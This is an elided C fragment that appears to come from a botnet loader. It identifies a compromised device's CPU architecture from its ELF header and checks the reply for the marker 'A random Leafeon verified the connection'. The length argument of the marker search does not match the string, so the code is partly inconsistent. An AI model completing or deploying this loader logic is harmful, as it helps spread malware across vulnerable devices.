...
int connection_consume_arch(struct connection *conn)
{
    if(!conn->info.has_arch)
    {
        ...
        if(elf_start_pos > 0)
        {
            ...
            else if(ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860)
            ...
            else if (ehdr->e_machine == EM_ARC || ehdr->e_machine == EM_ARC_COMPACT || ehdr->e_machine == EM_ARC_COMPACT2)
            ...
            else if(ehdr->e_machine == EM_XTENSA)
                strcpy(conn->info.arch, "xtensa");
            ...
            else if(ehdr->e_machine == EM_ALPHA || ehdr->e_machine == EM_VIDEOCORE)
                strcpy(conn->info.arch, "alpha");
            else
            {
                conn->info.arch[0] = 0;
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "A random Leafeon verified the connection", 29) == -1)
        return offset;
    else
        return 255 + offset;
}
